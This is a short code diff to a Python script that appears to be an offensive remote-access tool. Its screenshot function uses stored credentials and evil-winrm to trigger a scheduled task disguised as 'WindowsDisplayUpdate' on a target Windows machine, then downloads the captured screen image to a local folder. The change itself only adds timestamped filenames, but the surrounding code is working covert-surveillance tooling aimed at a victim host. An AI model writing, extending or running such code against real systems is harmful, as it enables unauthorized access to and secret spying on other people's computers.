@@ -4,6 +4,7 @@ import socket
 import getpass
 import platform
 import base64
+import time
 from datetime import datetime
 
 BANNER = r"""
@@ -96,9 +97,10 @@ def screenshot(target_ip):
     print("[*] Triggering screenshot task...")
 
     try:
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         TASK_NAME = "WindowsDisplayUpdate"
         REMOTE_FILE = "C:\\Users\\Public\\screen.png"
-        LOCAL_DIR = "./Box/screen.png"
+        LOCAL_FILE = f"./Box/screen_{target_ip}_{timestamp}.png"
         payload = 'schtasks /run /tn "WindowsDisplayUpdate"\nexit\n'
 
         subprocess.run(
@@ -114,7 +116,7 @@ def screenshot(target_ip):
 
         print("[*] Downloading screenshot...")
         
-        payload = f'download {REMOTE_FILE} {LOCAL_DIR}'
+        payload = f'download {REMOTE_FILE} {LOCAL_FILE}'
 
         subprocess.run(
             ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
@@ -124,7 +126,7 @@ def screenshot(target_ip):
             stderr=subprocess.DEVNULL
         )
 
-        print("[+] Screenshot saved to ./loot/")
+        print("[+] Screenshot saved to ./Box/")
     except:
         print("[-] Failed to save screenshot")
 
